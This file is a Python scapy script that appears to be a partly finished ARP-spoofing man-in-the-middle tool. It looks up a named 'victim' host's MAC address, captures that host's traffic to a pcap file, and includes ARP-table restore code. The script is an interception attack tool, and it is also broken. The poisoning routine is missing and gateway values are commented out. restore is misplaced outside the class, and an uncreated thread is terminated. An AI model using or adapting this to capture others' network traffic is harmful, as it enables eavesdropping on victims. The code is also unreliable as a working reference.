from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr,
                       send, sendp, sniff, sndrcv, srp, wrpcap)
import os
import sys
import time

from scapy.all import conf
print(conf.use_pcap)



def get_mac(targetip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

def restore(self):
    print('Restoring ARP tables...')
    sendp(Ether(dst=self.victimmac)/ARP(
        op=2,
        psrc=self.gateway,
        hwsrc=self.gatewaymac,
        pdst=self.victim,
        hwdst='ff:ff:ff:ff:ff:ff'),
        count=5)
    sendp(Ether(dst=self.gatewaymac)/ARP(
        op=2,
        psrc=self.victim,
        hwsrc=self.victimmac,
        pdst=self.gateway,
        hwdst='ff:ff:ff:ff:ff:ff'),
        count=5)
        
class Arper:
    def __init__(self, victim, gateway, interface='enp7s0'):
        self.victim = victim
        self.victimmac = get_mac(victim)

        # self.gateway = gateway
        # self.gatewaymac = get_mac(gateway)

        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        print(f'Initialized {interface}:')
        # print(f'Gateway ({gateway}) is at {self.gatewaymac}.')
        print(f'Victim ({victim}) is at {self.victimmac}.')
        print('-'*30)

    def run(self):
        self.sniff()
        # self.poison_thread = Process(target=self.poison)
        # self.sniff_thread = Process(target=self.sniff)

        # self.poison_thread.start()
        # self.sniff_thread.start()
        # print('here!!')

        # try:
        #     self.sniff_thread.join()
        #     self.poison_thread.join()
        # except KeyboardInterrupt:
        #     print("Parent got Ctrl+C, stapping children...")
        #     self.sniff_thread.terminate()
        #     self.restore()
        #     self.poison_thread.terminate()
        #     sys.exit()

    
    def sniff(self, count=10000):
        # print("Child PID:", os.getpid())
        # os.system("ip a show br0")
        # os.system("tcpdump -ni br0 -c 3 ip host {}".format(self.victim))

        # time.sleep(5)
        print(f'Sniffing {count} packets')
        bpf_filter = f"ip host {self.victim}"
        print(bpf_filter)
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print('Got the packets')
        self.restore()
        self.poison_thread.terminate()
        print('Finished.')

    # def restore(self):
    #     print('Restoring ARP tables...')
    #     sendp(Ether(dst=self.victimmac)/ARP(
    #         op=2,
    #         psrc=self.gateway,
    #         hwsrc=self.gatewaymac,
    #         pdst=self.victim,
    #         hwdst='ff:ff:ff:ff:ff:ff'),
    #         count=5)
    #     sendp(Ether(dst=self.gatewaymac)/ARP(
    #         op=2,
    #         psrc=self.victim,
    #         hwsrc=self.victimmac,
    #         pdst=self.gateway,
    #         hwdst='ff:ff:ff:ff:ff:ff'),
    #         count=5)

if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()